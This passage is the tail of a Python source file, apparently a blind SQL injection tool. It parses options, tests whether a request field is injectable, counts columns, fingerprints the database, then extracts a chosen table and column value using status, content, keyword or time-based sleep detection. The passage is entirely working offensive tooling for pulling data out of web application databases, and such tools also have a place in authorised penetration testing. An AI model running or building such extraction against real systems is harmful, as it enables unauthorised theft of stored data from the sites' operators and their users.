                        help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        usage()
        return

    if not args.url and not args.file:
        print("[!] You must provide either a URL (-u) or a request file (-f).")
        return
    if args.url and not args.file and not (args.injectable_headers or args.data):
        print(
            "[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
        return
    if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
        print("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extractrion.")
        return
    if args.data and args.file:
        print("[!] You cannot specify data for the request file outside of the request file.")
        return
    if args.sleep_only and args.sleep_only < 1:
        print(
            "[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 3")
    if args.sleep_only:
        args.timeout += args.sleep_only
    return args


### MAIN


def main():
    """
    where all the magic happens
    """

    args = arg_parse()
    json = load_queries()
    queries = json['queries']
    sl_queries = json['sl_queries']
    workers = max_workers(args)
    injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
    static_headers = dict(args.static_headers) if args.static_headers else {}
    request_template = None
    detection = None

    if args.file:
        request_template = load_request(args.file)
        if not request_template:
            return
    if args.force:
        if args.force == "keyword":
            if args.true_keywords or args.false_keywords:
                detection = "keyword"
            else:
                print("[!] You must provide keywords to force a keyword detection.")
                return
        elif args.force == "sleep":
            args.sleep_only = 10
            args.timeout += args.sleep_only
            detection = "sleep"
        else:
            detection = args.force
        print(f"[+] Skipping injection check and detection discovery. Using forced detection method: {detection}")
    else:
        # Step 1: Check if the field is injectable
        injectable, detection = is_injectable(injectable_headers=injectable_headers, static_headers=static_headers,
                                              request_template=request_template, args=args)
        if not injectable:
            return
        if not args.sleep_only:
            print(f"[+] Using {detection} detection method.")

    #Step 2: Count columns
    columns = column_count(detection=detection, workers=workers, queries=sl_queries, request_template=request_template, injectable_headers=injectable_headers, static_headers=static_headers, args=args)

    # Step 3: Detect the database type
    db_name, substring_query, sleep_query, length_query = detect_database(request_template=request_template, queries=queries, sl_queries=sl_queries, injectable_headers=injectable_headers,
                                                                          static_headers=static_headers, workers=workers, detection=detection, columns=columns, args=args)

    if not db_name:
        return
    elif not substring_query:
        print(f"[*] Database {db_name} detected, but substring operations are not applicable.")
        return

    # Step 4: Discover length of data
    length = discover_length(
        table=args.table,
        column=args.column,
        where_clause=args.where,
        db_name=db_name,
        substring_query=substring_query,
        sleep_query=sleep_query,
        length_query=length_query,
        detection=detection,
        request_template=request_template,
        injectable_headers=injectable_headers,
        static_headers=static_headers,
        args=args
    )

    if not length:
        if no_length():
            length = args.max_length
            print(f"[!] Data length not discovered. Defaulting to max length: {length} (adjust with --max-length)")
        else:
            print("[-] User chose not to proceed with extraction.")
            return

    # Step 5: Extract the data
    extracted_data = extract_data(
        table=args.table,
        column=args.column,
        where_clause=args.where,
        substring_query=substring_query,
        sleep_query=sleep_query,
        length=length,
        position=1,
        extraction=detection,
        request_template=request_template,
        injectable_headers=injectable_headers,
        static_headers=static_headers,
        workers=workers,
        args=args
    )

    # Step 6: Output the data
    if args.output_file:
        try:
            with open(args.output_file, 'w') as output_file:
                output_file.write(extracted_data)
            print(f"[+] Data written to {args.output_file}")
        except Exception as e:
            print(f"[-] Error writing to output file: {e}")
            print(f"Extracted data: {extracted_data}")
    else:
        print(f"Extracted data: {extracted_data}")


if __name__ == "__main__":
    main()
